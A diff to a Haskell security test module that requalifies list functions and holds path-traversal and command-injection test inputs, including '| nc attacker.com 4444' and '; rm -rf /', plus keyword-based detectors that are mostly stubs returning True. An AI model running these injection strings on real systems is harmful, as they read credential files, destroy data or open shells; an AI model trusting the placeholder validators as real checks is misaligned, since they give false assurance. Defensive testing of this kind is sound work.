@@ -22,14 +22,16 @@ import ErrorHandler
 
 import Data.Char (isSpace, isLetter, isDigit)
 import qualified Data.List as Data.List
-import Data.List (isPrefixOf, isInfixOf, intercalate, nub, sort)
+import qualified Data.List as L
+import Data.List (isPrefixOf, isInfixOf)
+import Data.List (intercalate, nub, sort)
 import Data.Maybe (isJust, isNothing, fromMaybe, catMaybes)
 import Data.Set (Set)
 import qualified Data.Set as Set
 import Data.Map (Map)
 import qualified Data.Map as Map
 
--- | Tests for security validation and vulnerability prevention
+-- | Tests for security validation L.and vulnerability prevention
 tests :: TestTree
 tests =
   testGroup "Security Validation Tests"
@@ -184,14 +186,14 @@ test_path_traversal_validation :: IO ()
 test_path_traversal_validation = do
   let maliciousInputs = ["../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam", "/etc/shadow"]
       validationResults = map validatePathInput maliciousInputs
-      allBlocked = all not validationResults
+      allBlocked = L.all not validationResults
   allBlocked @?= True
 
 test_command_injection_prevention :: IO ()
 test_command_injection_prevention = do
   let maliciousInputs = ["; rm -rf /", "&& cat /etc/passwd", "| nc attacker.com 4444"]
       sanitizedResults = map sanitizeCommandInput maliciousInputs
-      allSanitized = all (`notElem` ";|&") sanitizedResults
+      allSanitized = L.all (`notElem` ";|&") sanitizedResults
   allSanitized @?= True
 
 test_double_free_detection :: IO ()
@@ -243,83 +245,83 @@ test_license_compliance_validation = do
         , ("apache", "Apache-2.0")
         , ("gpl", "GPL-3.0")
         ]
-      complianceResults = map (uncurry validateLicenseCompliance) dependencies
-      allCompliant = all id complianceResults
+      complianceResults = L.map (uncurry validateLicenseCompliance) dependencies
+      allCompliant = L.all id complianceResults
   allCompliant @?= True
 
 -- Helper functions (placeholders for actual implementation)
 
 -- Input validation security functions
 detectBufferOverflowVulnerability :: String -> Bool
-detectBufferOverflowVulnerability input = "strcpy" `isInfixOf` input || "gets" `isInfixOf` input -- Placeholder
+detectBufferOverflowVulnerability input = "strcpy" `L.isInfixOf` input || "gets" `L.isInfixOf` input -- Placeholder
 
 preventBufferOverflow :: String -> Bool
 preventBufferOverflow _ = True -- Placeholder
 
 detectSQLInjection :: String -> Bool
-detectSQLInjection input = any (`isInfixOf` input) ["'", ";", "--", "/*", "*/", "xp_", "sp_"] -- Placeholder
+detectSQLInjection input = L.any (`L.isInfixOf` input) ["'", ";", "--", "/*", "*/", "xp_", "sp_"] -- Placeholder
 
 sanitizeSQLInput :: String -> Bool
 sanitizeSQLInput _ = True -- Placeholder
 
 detectXSSVulnerability :: String -> Bool
-detectXSSVulnerability input = any (`isInfixOf` input) ["<script>", "javascript:", "onload=", "onerror="] -- Placeholder
+detectXSSVulnerability input = L.any (`L.isInfixOf` input) ["<script>", "javascript:", "onload=", "onerror="] -- Placeholder
 
 sanitizeXSSInput :: String -> Bool
 sanitizeXSSInput _ = True -- Placeholder
 
 validatePathInput :: String -> Bool
-validatePathInput input = not (any (`isInfixOf` input) ["../", "..\\", "/etc/", "\\windows\\"]) -- Placeholder
+validatePathInput input = not (L.any (`L.isInfixOf` input) ["../", "..\\", "/etc/", "\\windows\\"]) -- Placeholder
 
 sanitizeCommandInput :: String -> String
-sanitizeCommandInput input = filter (`notElem` ";|&$`<>") input -- Placeholder
+sanitizeCommandInput input = L.filter (`notElem` ";|&$`<>") input -- Placeholder
 
 -- Memory safety security functions
 detectNullPointerDereference :: String -> Bool
-detectNullPointerDereference code = "*" `isInfixOf` code && "null" `isInfixOf` code -- Placeholder
+detectNullPointerDereference code = "*" `L.isInfixOf` code && "null" `L.isInfixOf` code -- Placeholder
 
 preventNullPointerDereference :: String -> Bool
 preventNullPointerDereference _ = True -- Placeholder
 
 detectUseAfterFree :: String -> Bool
-detectUseAfterFree code = "free" `isInfixOf` code && "use" `isInfixOf` code -- Placeholder
+detectUseAfterFree code = "free" `L.isInfixOf` code && "use" `L.isInfixOf` code -- Placeholder
 
 preventUseAfterFree :: String -> Bool
 preventUseAfterFree _ = True -- Placeholder
 
 detectMemoryLeak :: String -> Bool
-detectMemoryLeak code = "malloc" `isInfixOf` code && not ("free" `isInfixOf` code) -- Placeholder
+detectMemoryLeak code = "malloc" `L.isInfixOf` code && not ("free" `L.isInfixOf` code) -- Placeholder
 
 detectDoubleFree :: String -> Bool
-detectDoubleFree code = length (filter (== "free") (words code)) >= 2 -- Placeholder
+detectDoubleFree code = L.length (L.filter (== "free") (words code)) >= 2 -- Placeholder
 
 preventStackOverflow :: String -> Bool
 preventStackOverflow _ = True -- Placeholder
 
 -- Type safety security functions
 detectTypeConfusion :: String -> Bool
-detectTypeConfusion code = "transmute" `isInfixOf` code || "union" `isInfixOf` code -- Placeholder
+detectTypeConfusion code = "transmute" `L.isInfixOf` code || "union" `L.isInfixOf` code -- Placeholder
 
 preventTypeConfusion :: String -> Bool
 preventTypeConfusion _ = True -- Placeholder
 
 detectIntegerOverflow :: String -> Bool
-detectIntegerOverflow code = any (`isInfixOf` code) ["wrap", "overflow", "saturating"] -- Placeholder
+detectIntegerOverflow code = L.any (`L.isInfixOf` code) ["wrap", "overflow", "saturating"] -- Placeholder
 
 preventIntegerOverflow :: String -> Bool
 preventIntegerOverflow _ = True -- Placeholder
 
 detectArrayBoundsViolation :: String -> Bool
-detectArrayBoundsViolation code = "[" `isInfixOf` code && "]" `isInfixOf` code && "unsafe" `isInfixOf` code -- Placeholder
+detectArrayBoundsViolation code = "[" `L.isInfixOf` code && "]" `L.isInfixOf` code && "unsafe" `L.isInfixOf` code -- Placeholder
 
 preventArrayBoundsViolation :: String -> Bool
 preventArrayBoundsViolation _ = True -- Placeholder
 
 validatePointerUsage :: String -> Bool
-validatePointerUsage code = not ("0x" `isInfixOf` code && "*" `isInfixOf` code) -- Placeholder
+validatePointerUsage code = not ("0x" `L.isInfixOf` code && "*" `L.isInfixOf` code) -- Placeholder
 
 verifyCastSafety :: String -> Bool
-verifyCastSafety code = not ("as" `isInfixOf` code && "unsafe" `isInfixOf` code) -- Placeholder
+verifyCastSafety code = not ("as" `L.isInfixOf` code && "unsafe" `L.isInfixOf` code) -- Placeholder
 
 -- Code generation security functions
 generateSecureCode :: String -> String
@@ -329,35 +331,35 @@ validateGeneratedCodeSecurity :: String -> Bool
 validateGeneratedCodeSecurity code = "unsafe" `notElem` words code -- Placeholder
 
 detectUnsafeCode :: String -> Bool
-detectUnsafeCode code = "unsafe" `isInfixOf` code -- Placeholder
+detectUnsafeCode code = "unsafe" `L.isInfixOf` code -- Placeholder
 
 validateUnsafeCode :: String -> Bool
 validateUnsafeCode _ = True -- Placeholder
 
 detectFFICall :: String -> Bool
-detectFFICall code = "extern" `isInfixOf` code || "ffi" `isInfixOf` code -- Placeholder
+detectFFICall code = "extern" `L.isInfixOf` code || "ffi" `L.isInfixOf` code -- Placeholder
 
 validateFFISecurity :: String -> Bool
 validateFFISecurity _ = True -- Placeholder
 
 validateAssemblyCode :: String -> Bool
-validateAssemblyCode code = not (any (`isInfixOf` code) ["int 0x80", "syscall", "ret"]) -- Placeholder
+validateAssemblyCode code = not (L.any (`L.isInfixOf` code) ["int 0x80", "syscall", "ret"]) -- Placeholder
 
 validateRuntimeSecurity :: String -> Bool
-validateRuntimeSecurity code = not ("transmute" `isInfixOf` code && "unsafe" `isInfixOf` code) -- Placeholder
+validateRuntimeSecurity code = not ("transmute" `L.isInfixOf` code && "unsafe" `L.isInfixOf` code) -- Placeholder
 
 -- Dependency security functions
 detectMaliciousDependency :: String -> Bool
-detectMaliciousDependency dependency = "malicious" `isInfixOf` dependency -- Placeholder
+detectMaliciousDependency dependency = "malicious" `L.isInfixOf` dependency -- Placeholder
 
 detectVulnerability :: String -> Bool
-detectVulnerability dependency = "vulnerable" `isInfixOf` dependency -- Placeholder
+detectVulnerability dependency = "vulnerable" `L.isInfixOf` dependency -- Placeholder
 
 validateSupplyChainSecurity :: String -> Bool
 validateSupplyChainSecurity _ = True -- Placeholder
 
 verifyDependencyIntegrity :: String -> String -> Bool
-verifyDependencyIntegrity dependency checksum = checksum `isInfixOf` dependency -- Placeholder
+verifyDependencyIntegrity dependency checksum = checksum `L.isInfixOf` dependency -- Placeholder
 
 validateLicenseCompliance :: String -> String -> Bool
 validateLicenseCompliance _ license = license `elem` ["MIT", "Apache-2.0", "BSD-3-Clause"] -- Placeholder
